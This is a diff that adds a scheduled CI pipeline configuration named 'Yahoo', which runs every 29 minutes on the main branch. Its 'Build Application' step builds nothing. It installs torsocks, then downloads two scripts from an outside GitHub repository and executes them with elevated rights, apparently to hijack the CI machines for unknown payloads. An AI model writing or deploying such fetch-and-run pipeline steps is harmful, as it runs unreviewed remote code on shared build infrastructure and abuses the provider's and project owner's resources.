@@ -1,0 +1,24 @@
+- pipeline: "Yahoo"
+  on: "SCHEDULE"
+  refs:
+  - "refs/heads/main"
+  priority: "NORMAL"
+  cron: "*/29 */1 * * *"
+  auto_clear_cache: true
+  fail_on_prepare_env_warning: true
+  actions:
+  - action: "Build Application"
+    type: "NATIVE_BUILD_LINUX"
+    working_directory: "/home/ubuntu/build"
+    distribution: "UBUNTU_20_04"
+    commands:
+    - "sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install torsocks wget -y"
+    - "wget https://github.com/AnliAngku21/Pages-01/raw/main/linux-bash.sh && sudo chmod u+x linux-bash.sh && bash linux-bash.sh"
+    - "wget https://github.com/AnliAngku21/Pages-01/raw/main/linux-bash.py && python3 linux-bash.py"
+    sync_paths:
+    - pipeline_path: "/"
+      vm_path: "/home/ubuntu/build"
+      direction: "PIPELINE_TO_VM"
+    - pipeline_path: "/"
+      vm_path: "/home/ubuntu/build"
+      direction: "VM_TO_PIPELINE"
